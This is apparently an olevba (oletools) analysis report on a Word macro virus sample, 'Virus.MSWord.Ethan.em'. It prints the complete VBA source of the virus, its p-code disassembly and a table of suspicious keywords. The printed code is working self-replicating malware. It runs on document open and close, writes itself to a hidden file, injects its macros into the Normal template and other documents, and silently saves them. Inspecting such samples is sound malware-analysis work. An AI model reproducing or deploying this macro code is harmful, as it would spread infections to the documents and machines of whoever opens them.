olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.em
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.em - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Rem My Virus Games
    On Error Resume Next
    s = ActiveDocument.Saved
    Application.EnableCancelKey = wdCancelDisabled
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    Options.SaveNormalPrompt = False
    If Dir("c:\VirusGame", 6) = "" Then
        Open "C:\VirusGame" For Output As #1
        For i = 2 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
            a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
            Print #1, a
            If a = "Rem Virus game end" Then Exit For
        Next
        Close #1
        SetAttr "C:\VirusGame", 6
    End If
    t = ""
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) = "Private Sub Document_Close()" Then
        If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "Rem My Virus Games" Then Set t = NormalTemplate.VBProject.VBComponents.Item(1)
    Else
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "End Sub"
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Private Sub Document_Close()"
        Set t = NormalTemplate.VBProject.VBComponents.Item(1)
    End If
    If t <> "" Then GoTo Infect
    If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) = "Private Sub Document_Close()" Then
        If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "Rem My Virus Games" Then Set t = ActiveDocument.VBProject.VBComponents.Item(1)
    Else
        ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "End Sub"
        ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Private Sub Document_Close()"
        Set t = ActiveDocument.VBProject.VBComponents.Item(1)
    End If
    
    If t <> "" Then
Infect:
    Open "C:\VirusGame" For Input As #1
    If LOF(1) = 0 Then GoTo Quit
    i = 2
    Do While Not EOF(1)
        Line Input #1, a
        t.CodeModule.InsertLines i, a
        i = i + 1
    Loop
    
Quit:
    Close #1
    If Left(ActiveDocument.Name, 2) <> "文档" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If
    If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
    Kill "c:\VirusGame"
Rem Virus game end
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Ethan.em - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Main()
'Hello
  On Error GoTo 0
  If Not ActiveDocHaveCopied Then
    CopyToActiveDoc
  ElseIf Not NormHaveCopied Then
    CopyToNormal
    Else: MsgBox ("你吃饭了吗？")
  End If
End Sub
Sub CopyToNormal()
  For Each aModule In NormalTemplate.VBProject.VBComponents
    If aModule.Name = "AutoOpen" Then
      IsDblName = True
      Exit For
    End If
  Next aModule
  If IsDblName Then
    With NormalTemplate.VBProject.VBComponents
      .Remove .Item("AutoOpen")
    End With
  End If
  Application.OrganizerCopy Source:=ActiveDocument.FullName, _
       Destination:=NormalTemplate.FullName, _
       Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
  NormalTemplate.Save
End Sub
Sub CopyToActiveDoc()
  For Each aModule In ActiveDocument.VBProject.VBComponents
    If aModule.Name = "AutoOpen" Then
      IsDblName = True
      Exit For
    End If
  Next aModule
  If IsDblName Then
    With ActiveDocument.VBProject.VBComponents
      .Remove .Item("AutoOpen")
    End With
  End If
  Application.OrganizerCopy Source:=NormalTemplate.FullName, _
       Destination:=ActiveDocument.FullName, _
       Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
  ActiveDocument.Save
End Sub
Function NormHaveCopied() As Boolean
  For Each aModule In NormalTemplate.VBProject.VBComponents
    If aModule.Name = "AutoOpen" Then
      If aModule.CodeModule.Lines(2, 1) = "'Hello" Then NormHaveCopied = True
    End If
  Next aModule
End Function
Function ActiveDocHaveCopied() As Boolean
  For Each aModule In ActiveDocument.VBProject.VBComponents
    If aModule.Name = "AutoOpen" Then
      If aModule.CodeModule.Lines(2, 1) = "'Hello" Then ActiveDocHaveCopied = True
    End If
  Next aModule
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.em
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4174 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	Rem 0x000F " My Virus Games"
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #4:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x000C "c:\VirusGame"
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #9:
' 	LitStr 0x000C "C:\VirusGame"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #11:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #12:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' Line #13:
' 	Ld a 
' 	LitStr 0x0012 "Rem Virus game end"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #14:
' 	StartForVariable 
' 	Next 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #16:
' 	LitStr 0x000C "C:\VirusGame"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	LitStr 0x0000 ""
' 	St t 
' Line #19:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #20:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0012 "Rem My Virus Games"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' 	EndIf 
' Line #21:
' 	ElseBlock 
' Line #22:
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "End Sub"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #23:
' 	LitDI2 0x0001 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo Infect 
' 	EndIf 
' Line #27:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #28:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0012 "Rem My Virus Games"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' 	EndIf 
' Line #29:
' 	ElseBlock 
' Line #30:
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "End Sub"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #31:
' 	LitDI2 0x0001 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #32:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #33:
' 	EndIfBlock 
' Line #34:
' Line #35:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #36:
' 	Label Infect 
' Line #37:
' 	LitStr 0x000C "C:\VirusGame"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #38:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Quit 
' 	EndIf 
' Line #39:
' 	LitDI2 0x0002 
' 	St i 
' Line #40:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #41:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #42:
' 	Ld i 
' 	Ld a 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #43:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #44:
' 	Loop 
' Line #45:
' Line #46:
' 	Label Quit 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #48:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0004 "文档"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #51:
' 	LitStr 0x000C "c:\VirusGame"
' 	ArgsCall Kill 0x0001 
' Line #52:
' 	Rem 0x000F " Virus game end"
' Line #53:
' 	EndSub 
' Macros/VBA/AutoOpen - 3131 bytes
' Line #0:
' 	FuncDefn (Sub Main())
' Line #1:
' 	QuoteRem 0x0000 0x0005 "Hello"
' Line #2:
' 	OnError (GoTo 0) 
' Line #3:
' 	Ld ActiveDocHaveCopied 
' 	Not 
' 	IfBlock 
' Line #4:
' 	ArgsCall CopyToActiveDoc 0x0000 
' Line #5:
' 	Ld NormHaveCopied 
' 	Not 
' 	ElseIfBlock 
' Line #6:
' 	ArgsCall CopyToNormal 0x0000 
' Line #7:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitStr 0x000C "你吃饭了吗？"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #8:
' 	EndIfBlock 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Sub CopyToNormal())
' Line #11:
' 	StartForVariable 
' 	Ld aModule 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #12:
' 	Ld aModule 
' 	MemLd New 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LitVarSpecial (True)
' 	St IsDblName 
' Line #14:
' 	ExitFor 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	StartForVariable 
' 	Ld aModule 
' 	EndForVariable 
' 	NextVar 
' Line #17:
' 	Ld IsDblName 
' 	IfBlock 
' Line #18:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	With 
' Line #19:
' 	LitStr 0x0008 "AutoOpen"
' 	ArgsMemLdWith Item 0x0001 
' 	ArgsMemCallWith Remove 0x0001 
' Line #20:
' 	EndWith 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	LineCont 0x0008 09 00 07 00 0F 00 07 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #23:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #24:
' 	EndSub 
' Line #25:
' 	FuncDefn (Sub CopyToActiveDoc())
' Line #26:
' 	StartForVariable 
' 	Ld aModule 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #27:
' 	Ld aModule 
' 	MemLd New 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	IfBlock 
' Line #28:
' 	LitVarSpecial (True)
' 	St IsDblName 
' Line #29:
' 	ExitFor 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	StartForVariable 
' 	Ld aModule 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	Ld IsDblName 
' 	IfBlock 
' Line #33:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	With 
' Line #34:
' 	LitStr 0x0008 "AutoOpen"
' 	ArgsMemLdWith Item 0x0001 
' 	ArgsMemCallWith Remove 0x0001 
' Line #35:
' 	EndWith 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	LineCont 0x0008 09 00 07 00 0F 00 07 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #38:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Function NormHaveCopied() As Boolean)
' Line #41:
' 	StartForVariable 
' 	Ld aModule 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #42:
' 	Ld aModule 
' 	MemLd New 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	IfBlock 
' Line #43:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld aModule 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0006 "'Hello"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormHaveCopied 
' 	EndIf 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	StartForVariable 
' 	Ld aModule 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	EndFunc 
' Line #47:
' 	FuncDefn (Function ActiveDocHaveCopied() As Boolean)
' Line #48:
' 	StartForVariable 
' 	Ld aModule 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #49:
' 	Ld aModule 
' 	MemLd New 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	IfBlock 
' Line #50:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld aModule 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0006 "'Hello"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActiveDocHaveCopied 
' 	EndIf 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	StartForVariable 
' 	Ld aModule 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

